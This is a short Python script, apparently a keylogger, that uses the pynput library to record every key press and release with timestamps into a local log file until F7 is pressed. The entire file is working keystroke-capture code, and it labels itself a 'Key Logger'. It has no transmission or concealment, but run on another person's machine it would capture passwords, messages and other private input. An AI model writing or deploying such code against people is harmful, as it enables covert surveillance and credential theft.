from pynput.keyboard import Key, Listener
import time

fp = open(r"LogTXT_{}.txt".format(time.strftime("%Y-%m-%d_%H-%M-%S", time.localtime())),"w") # open the file. (Add a path before LogTXT_{}.txt, the default is where the python file is.)

def on_press(key):
    fp.write('{} pressed at time:{}\n\n'.format(key,time.strftime("%Y-%m-%d_%H-%M-%S", time.localtime()))) # write it.

def on_release(key):
    fp.write('{} release at time:{}\n\n'.format(key,time.strftime("%Y-%m-%d_%H-%M-%S", time.localtime()))) # write it.
    if key == Key.f7:
        fp.write("<Key Logger Ended>") # Press F7 to Exit the script. (And Apply changes)
        fp.close()
        return False

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()